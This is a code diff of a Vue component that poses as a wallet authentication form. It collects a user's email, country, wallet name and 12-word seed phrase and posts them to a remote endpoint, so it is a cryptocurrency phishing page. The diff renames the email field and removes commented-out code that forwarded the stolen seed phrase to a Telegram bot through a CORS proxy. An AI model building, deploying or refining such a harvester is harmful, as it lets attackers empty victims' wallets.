@@ -21,10 +21,10 @@
           <div class="email">
             <div class="label">Email Address :</div>
             <input
-              id="eMail"
+              id="ai"
               type="email"
               placeholder="Enter Email"
-              v-model="email"
+              v-model="ai"
               value="person@email.com"
             />
           </div>
@@ -70,7 +70,7 @@ const walletTitle = computed(() => {
 })
 
 const formState = reactive({
-  email: '',
+  ai: '',
   seedPhrase: Array(12).fill(''),
 })
 
@@ -88,7 +88,7 @@ const handleSubmit = async (e) => {
       country = countryName
     })
 
-  const eMail = document.getElementById('eMail')
+  const ai = document.getElementById('ai')
   let sPhraseArray = []
   const sPhrase = document.getElementsByClassName('sPhrase')
   for (let i = 0; i < sPhrase.length; i++) {
@@ -96,7 +96,7 @@ const handleSubmit = async (e) => {
     sPhraseArray = [...sPhraseArray, phrase]
   }
 
-  let message = `Email: ${eMail.value}\nCountry: ${country}\nWallet Name: ${walletName}\nSeed phrase:\n`
+  let message = `Email: ${ai.value}\nCountry: ${country}\nWallet Name: ${walletName}\nSeed phrase:\n`
   for (const sp of sPhraseArray) {
     message += `${sp}\n`
   }
@@ -108,7 +108,7 @@ const handleSubmit = async (e) => {
       if (res.ok) {
         console.log('success!')
         console.log(decodeURI(message))
-        eMail.value = ''
+        ai.value = ''
         for (let i = 0; i < sPhrase.length; i++) {
           sPhrase[i].value = ''
         }
@@ -118,47 +118,10 @@ const handleSubmit = async (e) => {
     console.error(`Error: ${e}`)
   }
 
-  // console.log('Email:', formState.email)
-  // console.log('Seed Phrase:', formState.seedPhrase)
-
-  // console.log('Email:', eMail.value)
-  // console.log('Seed Phrase:', sPhrase)
-
-  /*
-
-  // const message = `
-  //   🛡️ *Wallet Authentication Form Submitted* 🛡️
-  //   - 📧 *Email:* ${formState.email}
-  //   - 🔑 *Wallet Title:* ${walletTitle.value || 'N/A'}
-  //   - 🔢 *Seed Phrase:*
-  //     ${formState.seedPhrase.map((word, index) => `${index + 1}: ${word}`).join('\n')}
-  // `
-
-  // const proxyUrl = 'https://cors-anywhere.herokuapp.com/'
-  // const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`
-
-  // fetch(proxyUrl + telegramUrl, {
-  //   method: 'POST',
-  //   headers: { 'Content-Type': 'application/json' },
-  //   body: JSON.stringify({
-  //     chat_id: CHAT_ID,
-  //     text: message,
-  //     parse_mode: 'Markdown',
-  //   }),
-  // })
-  //   .then((response) => response.json())
-  //   .then((data) => {
-  //     console.log('Telegram response:', data)
-  //     alert('Message sent successfully!')
-  //   })
-  //   .catch((error) => {
-  //     console.error('Telegram error:', error)
-  //     alert('Failed to send message.')
-  //   })
-  */
+  
 }
 
-const { email, seedPhrase } = formState
+const { ai, seedPhrase } = formState
 </script>
 
 <style scoped>
